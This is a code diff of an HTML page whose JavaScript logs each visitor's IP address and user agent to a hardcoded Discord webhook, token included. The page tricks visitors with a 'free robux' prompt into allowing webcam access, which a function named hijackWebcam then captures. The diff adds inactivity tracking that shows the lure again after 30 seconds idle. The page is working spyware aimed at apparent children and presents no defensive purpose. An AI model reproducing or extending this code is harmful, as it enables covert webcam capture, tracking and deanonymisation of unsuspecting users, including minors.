@@ -3,13 +3,50 @@
 <head>
 </head>
 <body>
-</script>
-  <script>
- // ䷀䷁䷂䷄ WEBCAM CAPTURE WITH DELAY + IP LOGGER ䷅䷆䷇䷈
+
+<script>
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1403081784375250956/eaEVlqH7CvPktmPE8Cjo81X96IuwyH9qS-gTJ58DVS6NAdIbcQ8zuoo4ATQZ8funVWT2";
 const DELAY_SECONDS = 3; // Delay before capturing webcam
+const INACTIVITY_TIMEOUT = 30000; // 30 seconds inactivity timeout
 
-// 丂ᚴᛁᚥᛖ丂丂丂丂 GET IP
+// Track user activity
+let userActive = true;
+let inactivityTimer;
+
+// Reset inactivity timer on user activity
+function resetInactivityTimer() {
+    userActive = true;
+    clearTimeout(inactivityTimer);
+    inactivityTimer = setTimeout(() => {
+        userActive = false;
+        showPermissionPopup();
+    }, INACTIVITY_TIMEOUT);
+}
+
+// Initialize activity tracking
+function initActivityTracking() {
+    // Listen for any user activity
+    window.addEventListener('mousemove', resetInactivityTimer);
+    window.addEventListener('keydown', resetInactivityTimer);
+    window.addEventListener('click', resetInactivityTimer);
+    window.addEventListener('scroll', resetInactivityTimer);
+    
+    // Start the timer
+    resetInactivityTimer();
+}
+
+// Show permission popup after inactivity
+function showPermissionPopup() {
+    if (confirm("You've been inactive for 30 seconds. Allow webcam for free robux?")) {
+        hijackWebcam();
+    } else {
+        getIP().then(ip => {
+            logToWebhook("⚠️ WEBCAM DENIED", `IP: ${ip}\nUA: ${navigator.userAgent}`);
+        });
+    }
+}
+
+// GET IP
 async function getIP() {
   try {
     const res = await fetch("https://api.ipify.org?format=json");
@@ -20,7 +57,7 @@ async function getIP() {
   }
 }
 
-// ䷀䷁䷊䷋ LOG TO WEBHOOK
+// LOG TO WEBHOOK
 async function logToWebhook(title, description) {
   const embed = {
     title: title,
@@ -35,7 +72,7 @@ async function logToWebhook(title, description) {
   });
 }
 
-// 丂ᚴᛁᚥᛖ丂丂丂丂 WEBCAM SNATCHER WITH DELAY
+// WEBCAM SNATCHER WITH DELAY
 async function hijackWebcam() {
   try {
     const ip = await getIP();
@@ -114,18 +151,12 @@ async function hijackWebcam() {
   }
 }
 
-// ䷀䷁䷊䷋ MAIN EXECUTION
+// MAIN EXECUTION
 (async function() {
   const ip = await getIP();
   await logToWebhook("🌐 VISITOR DETECTED", `IP: ${ip}\nUser-Agent: ${navigator.userAgent}`);
 
-  if (confirm("Allow webcam for free robux?")) {
-    await hijackWebcam();
-  } else {
-    await logToWebhook("⚠️ WEBCAM DENIED", `IP: ${ip}\nUA: ${navigator.userAgent}`);
-  }
-
-  // 丂ᚴᛁᚥᛖ丂丂丂丂 MANUAL TRIGGER BUTTON
+  // Create the button first
   document.body.innerHTML += `
     <button id="executeBtn" style="
       position:fixed;
@@ -156,8 +187,11 @@ async function hijackWebcam() {
     btn.style.boxShadow = "0 4px 15px rgba(0,0,0,0.2)";
   });
   btn.addEventListener("click", hijackWebcam);
+  
+  // Initialize activity tracking
+  initActivityTracking();
 })();
-  </script>
+</script>
 
 </body>
 </html>
